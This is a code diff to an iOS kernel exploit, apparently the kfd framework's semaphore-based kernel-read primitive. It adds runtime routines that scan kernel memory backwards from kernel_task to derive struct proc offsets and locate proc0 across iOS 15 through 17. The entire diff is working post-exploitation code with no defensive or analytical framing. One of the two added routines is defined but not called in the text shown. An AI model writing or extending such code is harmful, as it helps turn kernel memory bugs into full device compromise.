@@ -5,6 +5,8 @@
 #ifndef kread_sem_open_h
 #define kread_sem_open_h
 
+extern u64 gKeKfdKernelProc;
+
 const char* kread_sem_open_name = "kfd-posix-semaphore";
 
 u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
@@ -92,12 +94,106 @@ void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
     kread_from_method(u64, kread_sem_open_kread_u64);
 }
 
+static void ke_sem_derive_proc_layout(struct kfd* kfd, u64 task_kaddr)
+{
+    // Serotonin-style runtime derivation (no kernelcache, no patchfinder):
+    // the semaphore owner is kernel_task, and struct proc either embeds the
+    // task at +0x10 (iOS 15/17: xnu-8019/xnu-10002) or is allocated right
+    // before it in the same zone (iOS 16: task = proc + object_size).
+    u64 objectSize = 0;
+    u64 pidOff = 0x68;
+
+    for (u64 d = 0x300; d <= 0x1000; d += 8) {
+        u64 v = 0;
+        u64 cand = task_kaddr - d;
+        kread((u64)kfd, cand + 0x10, &v, sizeof(v));
+        if (v == task_kaddr) {
+            objectSize = d;
+            break;
+        }
+    }
+
+    if (objectSize == 0) {
+        pidOff = 0x60;
+        for (u64 d = 0x300; d <= 0x1000; d += 8) {
+            u64 cand = task_kaddr - d;
+            u32 pid = 0xFFFFFFFF;
+            kread((u64)kfd, cand + 0x60, &pid, sizeof(pid));
+            if (pid != 0) {
+                continue;
+            }
+            u64 prev = 0;
+            kread((u64)kfd, cand + 0x8, &prev, sizeof(prev));
+            if ((prev & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                objectSize = d;
+                break;
+            }
+        }
+    }
+
+    dynamic_system_info.proc__object_size = objectSize;
+    dynamic_system_info.proc__p_pid = pidOff;
+    dynamic_system_info.proc__p_list__le_next = 0x0;
+    dynamic_system_info.proc__p_list__le_prev = 0x8;
+    dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
+    dynamic_system_info.proc__task = (pidOff == 0x68) ? 0x10 : 0x0;
+    dynamic_system_info.task__map = 0x28;
+}
+
+// Runtime derivation of the struct proc layout, Serotonin-style:
+// the semaphore owner is kernel_task (task of proc0). Scan backwards to find
+// the proc allocation and derive object_size / pid offset / task placement —
+// no offsets table, no kernelcache, no patchfinder needed.
+static void ke_kfd_derive_proc_layout(struct kfd* kfd, u64 task_kaddr)
+{
+    // 15.x / 17.x: struct proc embeds the task at +0x10.
+    for (u64 d = 0x300; d <= 0x1000; d += 8) {
+        u64 v = 0;
+        u64 cand = task_kaddr - d;
+        kread((u64)kfd, cand + 0x10, &v, sizeof(v));
+        if (v == task_kaddr) {
+            dynamic_system_info.proc__object_size = d;
+            dynamic_system_info.proc__p_pid = 0x68;
+            dynamic_system_info.proc__p_list__le_next = 0x0;
+            dynamic_system_info.proc__p_list__le_prev = 0x8;
+            dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
+            dynamic_system_info.proc__task = 0x10;
+            dynamic_system_info.task__map = 0x28;
+            gKeKfdKernelProc = cand;
+            return;
+        }
+    }
+
+    // 16.x: task no longer embedded; allocated right after the proc object.
+    // proc0 has pid==0 and a valid (signed) p_list.le_prev.
+    for (u64 d = 0x300; d <= 0x1000; d += 8) {
+        u64 cand = task_kaddr - d;
+        u32 pid60 = 0xFFFFFFFF;
+        kread((u64)kfd, cand + 0x60, &pid60, sizeof(pid60));
+        if (pid60 != 0) continue;
+        u64 prev = 0;
+        kread((u64)kfd, cand + 0x8, &prev, sizeof(prev));
+        if ((prev & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+            dynamic_system_info.proc__object_size = d;
+            dynamic_system_info.proc__p_pid = 0x60;
+            dynamic_system_info.proc__p_list__le_next = 0x0;
+            dynamic_system_info.proc__p_list__le_prev = 0x8;
+            dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
+            dynamic_system_info.proc__task = 0x0;
+            dynamic_system_info.task__map = 0x28;
+            gKeKfdKernelProc = cand;
+            return;
+        }
+    }
+}
+
 void kread_sem_open_find_proc(struct kfd* kfd)
 {
     volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
     u64 pseminfo_kaddr = pnode->pinfo;
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
     u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
+    ke_kfd_derive_proc_layout(kfd, task_kaddr);
     u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
     kfd->info.kaddr.kernel_proc = proc_kaddr;
 
